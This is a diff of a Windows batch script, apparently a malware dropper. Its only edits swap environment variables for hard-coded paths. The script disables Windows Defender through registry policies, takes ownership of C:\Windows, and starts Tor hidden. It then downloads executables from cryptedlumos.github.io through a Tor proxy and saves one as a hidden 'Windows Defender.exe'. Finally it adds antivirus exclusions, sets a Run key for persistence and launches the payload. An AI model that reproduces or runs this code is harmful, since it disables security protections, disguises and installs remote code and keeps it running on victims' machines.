@@ -1,6 +1,6 @@
 @echo off
 attrib +s +h +i "%~dp0"
-attrib +s +h +i "%systemdrive%\Tor"
+attrib +s +h +i "C:\Tor"
 
 :connectivitycheck
 ping www.google.com -n 1 -w 5000 >NUL
@@ -21,30 +21,30 @@ REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Ti
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
 taskkill /f /im explorer.exe
-start "" "%windir%\explorer.exe"  
+start "" "C:\Windows\explorer.exe"  
 
-REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%windir%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "C:\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
-nircmd exec hide "%systemdrive%\Tor\tor.exe"
+nircmd exec hide "C:\Tor\tor.exe"
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
   set "proxy=--tlsv1"
 )
 
-TAKEOWN /F "%windir%"
-ICACLS "%windir%" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
+TAKEOWN /F "C:\Windows"
+ICACLS "C:\Windows" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
 
-mkdir "%windir%\Win32"
-attrib +s +h +i "%windir%\Win32"
-curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "%windir%\Windows Defender.exe" && attrib +s +h +i "%windir%\Windows Defender.exe"
-curl.exe %proxy% https://cryptedlumos.github.io/Capture/nircmd.exe --output "%windir%\nircmd.exe" && attrib +s +h +i "%windir%\nircmd.exe"
-curl.exe %proxy% https://cryptedlumos.github.io/Capture/curl.exe --output "%windir%\curl.exe" && attrib +s +h +i "%windir%\curl.exe"
+mkdir "C:\Windows\Win32"
+attrib +s +h +i "C:\Windows\Win32"
+curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/Capture/nircmd.exe --output "C:\Windows\nircmd.exe" && attrib +s +h +i "C:\Windows\nircmd.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/Capture/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "C:\Windows\curl.exe"
 
 powershell.exe Add-MpPreference -ExclusionPath "%temp%"
-powershell.exe Add-MpPreference -ExclusionPath "%windir%"
+powershell.exe Add-MpPreference -ExclusionPath "C:\Windows"
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
-"%windir%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
+"C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 
 
